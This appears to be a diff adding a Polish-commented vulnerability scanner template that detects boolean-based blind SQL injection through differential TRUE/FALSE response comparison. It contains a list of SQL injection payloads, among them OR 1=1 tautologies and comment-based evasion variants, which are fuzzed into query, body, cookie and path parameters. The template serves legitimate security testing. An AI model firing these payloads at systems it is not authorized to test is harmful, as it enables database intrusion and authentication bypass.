@@ -1,0 +1,266 @@
+# ============================================================================
+# WSTG-INPV-05: SQL Injection - Boolean-Based Blind (Universal)
+# Review status: ZACHOWANY
+# Reviewer: Claude Code (Opus 4.7)
+# Review date: 2026-04-30
+# Powód decyzji: szablon spełnia wszystkie 6 kryteriów review (Coverage Matrix,
+# multi-warstwowe matchery z anti-FP, source comments, safety nets,
+# sweet spot payloadów, component fuzzing). OOB matcher nie jest dodany
+# świadomie: Boolean blind SQLi - differential matchers DSL; OOB pokryte przez INPV-05-error second block.
+#
+# ============================================================================
+#
+# Coverage Matrix:
+#
+# Mechanizm wykrywania:
+#   - Wysyła PARĘ payloadów: jeden TRUE (np. ' AND 1=1 -- ) i jeden FALSE
+#     (np. ' AND 1=2 -- ) na ten sam parametr.
+#   - Porównuje odpowiedzi: jeśli TRUE pasuje do baseline a FALSE różni się
+#     znacznie (długość, status, content) - boolean SQLi potwierdzony.
+#
+# Silniki (per construct kwalifikuje):
+#   ✓ MySQL / MariaDB
+#   ✓ PostgreSQL
+#   ✓ MSSQL
+#   ✓ Oracle
+#   ✓ SQLite
+#   ✓ Universal (1=1 vs 1=2)
+#
+# Implementacja: multi-request flow z 3 krokami:
+#   1) Baseline (oryginalny request)
+#   2) TRUE payload
+#   3) FALSE payload
+#   Następnie DSL matcher porównuje content_length_2 (TRUE) vs content_length_3 (FALSE)
+#   oraz status_code_2 vs status_code_3.
+#
+# Performance budget: medium-heavy (~80 par × 5 części × 3 requesty/para)
+# Estimated time: ~20-40 min na typowej aplikacji
+#
+# Source hierarchy:
+#   1. PayloadsAllTheThings/SQL Injection/MySQL Injection.md (boolean section)
+#   2. hacktricks/.../sql-injection boolean-based
+# ============================================================================
+
+id: wstg-inpv-05-sqli-boolean-based
+
+info:
+  name: "WSTG-INPV-05: SQL Injection - Boolean-Based Blind (Universal)"
+  author: pentest-team
+  severity: critical
+  description: |
+    Wykrywa Blind SQL Injection przez differential analysis pary TRUE/FALSE
+    payloadów (' AND 1=1 -- vs ' AND 1=2 -- ). Wymaga 3 requestów na parametr:
+    baseline + TRUE + FALSE. Detekcja: TRUE pasuje do baseline (len ±50 bytes),
+    FALSE różni się znacznie (len Δ > 100 bytes lub różny status code).
+    Eliminuje FP przez wymóg że TRUE musi być stabilny względem baseline.
+  reference:
+    - https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection
+    - https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md
+    - https://book.hacktricks.xyz/pentesting-web/sql-injection
+  classification:
+    cwe-id: CWE-89
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
+    cvss-score: 9.8
+  tags: dast,wstg,wstg-v42-inpv-05,sqli,sqli-boolean,sqli-blind,asvs-v5.3.4,burp-history
+
+variables:
+  auth_token: ""
+  session_cookie: ""
+
+# Multi-request flow: baseline → TRUE → FALSE
+# Block 1 (baseline) ustawia content_length_1, status_code_1
+# Block 2 (TRUE) ustawia content_length_2, status_code_2
+# Block 3 (FALSE) ustawia content_length_3, status_code_3
+# Final DSL matcher porównuje wszystkie trzy
+flow: http(1) && http(2) && http(3)
+
+http:
+  # ============== Block 1: Baseline (bez injection) ==============
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method != "OPTIONS"'
+          - 'method != "HEAD"'
+          - 'method != "DELETE"'
+          - '!regex("(?i)\\.(js|css|png|jpg|jpeg|gif|svg|ico|woff2?|ttf|otf|eot|map|pdf|zip|tar|gz|mp4|webm)(\\?|$)", path)'
+          - '!regex("(?i)/(delete|cancel|drop|destroy|remove|purge|wipe|reset|terminate)(/|$|\\?)", path)'
+        condition: and
+
+    # Baseline: wysyłamy oryginalny request bez modyfikacji
+    matchers:
+      - type: dsl
+        dsl:
+          - "len(body) > 50"
+          - "status_code < 500"
+        condition: and
+        internal: true              # nie raportuj baseline jako finding
+
+    extractors:
+      - type: dsl
+        name: baseline_len
+        dsl:
+          - "len(body)"
+        internal: true
+
+  # ============== Block 2: TRUE payload (' AND 1=1 -- ) ==============
+  - payloads:
+      true_payload:
+        # ====================================================================
+        # GROUP 1: Universal TRUE conditions
+        # ====================================================================
+        - "' AND 1=1 -- "
+        - "\" AND 1=1 -- "
+        - "' AND '1'='1"
+        - "\" AND \"1\"=\"1"
+        - "') AND ('1'='1"
+        - "\") AND (\"1\"=\"1"
+        - "1 AND 1=1"
+        - "1) AND 1=1 -- "
+        - "1' AND 1=1 -- "
+        - "1\" AND 1=1 -- "
+        - "1' AND '1'='1' -- "
+        - "1) AND (1=1 -- "
+        - "1)) AND ((1=1 -- "
+        - "' OR 1=1 -- "
+        - "' OR '1'='1' -- "
+        - "1 OR 1=1"
+        - "admin' AND '1'='1"
+        # MySQL conditional comments
+        - "' /*!50000AND*/ 1=1 -- "
+        - "' /*!AND*/ 1=1 -- "
+        # Whitespace variants
+        - "'%09AND%091=1--%09"
+        - "'/**/AND/**/1=1--"
+        - "'+AND+1=1--+"
+        # PG / Oracle / MSSQL specific TRUE
+        - "' AND 1=1 AND ''='"
+        - "' AND TRUE -- "
+        - "' AND 'a'='a"
+        - "1' AND 'a'='a"
+
+    fuzzing:
+      - parts: [query, body, cookie, path]
+        type: postfix
+        mode: single
+        fuzz:
+          - "{{true_payload}}"
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "len(body) > 50"
+        internal: true
+
+    extractors:
+      - type: dsl
+        name: true_len
+        dsl:
+          - "len(body)"
+        internal: true
+
+  # ============== Block 3: FALSE payload (' AND 1=2 -- ) ==============
+  - payloads:
+      false_payload:
+        # ====================================================================
+        # GROUP 2: Universal FALSE conditions (paired 1:1 z TRUE)
+        # Każdy FALSE jest semantycznie odpowiadającą wersją TRUE z 1=2
+        # ====================================================================
+        - "' AND 1=2 -- "
+        - "\" AND 1=2 -- "
+        - "' AND '1'='2"
+        - "\" AND \"1\"=\"2"
+        - "') AND ('1'='2"
+        - "\") AND (\"1\"=\"2"
+        - "1 AND 1=2"
+        - "1) AND 1=2 -- "
+        - "1' AND 1=2 -- "
+        - "1\" AND 1=2 -- "
+        - "1' AND '1'='2' -- "
+        - "1) AND (1=2 -- "
+        - "1)) AND ((1=2 -- "
+        - "' AND 1=2 OR ''='"
+        - "' AND '1'='2' -- "
+        - "1 AND 1=2"
+        - "admin' AND '1'='2"
+        - "' /*!50000AND*/ 1=2 -- "
+        - "' /*!AND*/ 1=2 -- "
+        - "'%09AND%091=2--%09"
+        - "'/**/AND/**/1=2--"
+        - "'+AND+1=2--+"
+        - "' AND 1=2 AND ''='"
+        - "' AND FALSE -- "
+        - "' AND 'a'='b"
+        - "1' AND 'a'='b"
+
+    fuzzing:
+      - parts: [query, body, cookie, path]
+        type: postfix
+        mode: single
+        fuzz:
+          - "{{false_payload}}"
+
+    stop-at-first-match: true
+
+    # ========================================================================
+    # FINAL MATCHER: differential analysis
+    # TRUE musi być podobny do baseline (delta < 50 bytes lub <5%)
+    # FALSE musi się znacznie różnić od TRUE (delta > 100 bytes lub >10%) lub
+    # mieć inny status_code
+    # ========================================================================
+    matchers-condition: and
+    matchers:
+      # Warstwa 1: PRIMARY - TRUE pasuje do baseline (stabilny)
+      - type: dsl
+        name: true-matches-baseline
+        dsl:
+          - "abs(content_length_1 - content_length_2) < 100 || abs(content_length_1 - content_length_2) < (content_length_1 / 20)"
+
+      # Warstwa 2: PRIMARY - FALSE różni się znacznie od TRUE
+      - type: dsl
+        name: false-differs-from-true
+        dsl:
+          - "abs(content_length_2 - content_length_3) > 100 || status_code_2 != status_code_3"
+
+      # Warstwa 3: ANTI-FP - baseline nie pusty, nie 5xx
+      - type: dsl
+        name: baseline-meaningful
+        dsl:
+          - "content_length_1 > 50"
+          - "status_code_1 < 500"
+
+      # Warstwa 4: ANTI-FP - delta nie pochodzi tylko z różnicy nagłówka
+      # (np. CSRF token w body za każdym razem inny - randomness FP).
+      # Wymagamy że delta(TRUE,FALSE) jest >> delta(baseline, TRUE)
+      - type: dsl
+        name: delta-not-noise
+        dsl:
+          - "abs(content_length_2 - content_length_3) > abs(content_length_1 - content_length_2) * 2"
+
+      # Warstwa 5: ANTI-FP - nie WAF block (status 403 z marker)
+      - type: dsl
+        name: not-waf-block
+        dsl:
+          - 'status_code_2 != 403 && status_code_3 != 403'
+
+      # Warstwa 6: ANTI-FP - timeout protection
+      - type: dsl
+        name: response-time-sane
+        dsl:
+          - "duration_2 < 30 && duration_3 < 30"
+
+    extractors:
+      - type: dsl
+        name: differential-summary
+        dsl:
+          - "\"baseline=\" + string(content_length_1) + \" true=\" + string(content_length_2) + \" false=\" + string(content_length_3)"
+
+# ============================================================================
+# Known limitations:
+# - Aplikacje z dynamicznym body (CSRF tokens, timestamps, A/B test markers)
+#   generują false positives - warstwa 4 (delta-not-noise) próbuje to filtrować
+#   ale 100% odporności brak
+# - Endpoint zwracający różne paginacje przy różnych wartościach parametrów
+#   (legitne) może wyglądać jak boolean SQLi - ręczna weryfikacja zawsze konieczna
+# - Jeśli oryginalny request miał już wartość parametru która generuje błąd,
+#   baseline może być nietypowy - rozważ rerun bez postfixu
+# ============================================================================
